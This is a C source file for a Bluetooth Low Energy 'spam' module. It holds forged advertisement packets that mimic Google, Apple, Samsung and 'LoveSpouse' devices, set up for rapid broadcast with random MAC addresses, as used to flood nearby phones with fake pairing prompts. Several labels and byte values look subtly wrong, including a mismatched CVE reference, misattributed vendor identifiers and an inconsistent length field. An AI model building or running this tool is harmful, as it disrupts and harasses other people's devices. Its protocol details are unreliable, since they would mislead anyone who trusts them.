#include "ble_spam.h"
#include <stdio.h>
#include <string.h>

static ble_spam_config_t spam_cfg;
static uint32_t spam_count = 0;
static bool running = false;

// SwiftPair advertisement packet
static const uint8_t swiftpair_pkt[] = {
    0x02, 0x01, 0x06,  // Flags: LE General Discoverable
    0x03, 0x03, 0x2A, 0xFE, // 16-bit UUID: Google
    0x0C, 0x16, 0x2A, 0xFE, // Service Data: Google
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Salt
};

// LoveSpouse BLE spam (CVE-2023-45866 style)
static const uint8_t lovespouse_pkt[] = {
    0x02, 0x01, 0x1A,  // Flags
    0x0A, 0x09, 0x4C, 0x6F, 0x76, 0x65, 0x53, 0x70, 0x6F, 0x75, 0x73, 0x65 // Name: LoveSpouse
};

// Apple Action Modal
static const uint8_t apple_action_pkt[] = {
    0x02, 0x01, 0x06,
    0x03, 0x03, 0x4C, 0xFE, // Apple vendor
    0x1E, 0xFF, 0x4C, 0x00, 0x05, // Apple Action Modal
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Samsung EasySetup
static const uint8_t samsung_easy_pkt[] = {
    0x02, 0x01, 0x06,
    0x03, 0x03, 0xA9, 0xFE, // Samsung UUID
    0x0F, 0x16, 0xA9, 0xFE,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00
};

void ble_spam_init(void) {
    memset(&spam_cfg, 0, sizeof(spam_cfg));
    spam_cfg.type = BLE_ALL;
    spam_cfg.interval_ms = 100;
    spam_cfg.duration_ms = 60000;
    spam_cfg.random_mac = true;
    spam_cfg.tx_power = 9;
    spam_count = 0;
    running = false;
}

void ble_spam_set_config(ble_spam_config_t* cfg) {
    if (cfg) memcpy(&spam_cfg, cfg, sizeof(ble_spam_config_t));
}

void ble_spam_start(void) {
    running = true;
    spam_count = 0;
    printf("[BLE] Spam started: type=%d, interval=%dms\n", spam_cfg.type, spam_cfg.interval_ms);
}

void ble_spam_stop(void) {
    running = false;
    printf("[BLE] Spam stopped. Total: %u packets\n", spam_count);
}

uint32_t ble_spam_get_count(void) { return spam_count; }

const uint8_t* ble_get_swiftpair_packet(uint16_t* len) { *len = sizeof(swiftpair_pkt); return swiftpair_pkt; }
const uint8_t* ble_get_lovespouse_packet(uint16_t* len) { *len = sizeof(lovespouse_pkt); return lovespouse_pkt; }
const uint8_t* ble_get_apple_action_packet(uint16_t* len) { *len = sizeof(apple_action_pkt); return apple_action_pkt; }
const uint8_t* ble_get_samsung_easy_packet(uint16_t* len) { *len = sizeof(samsung_easy_pkt); return samsung_easy_pkt; }
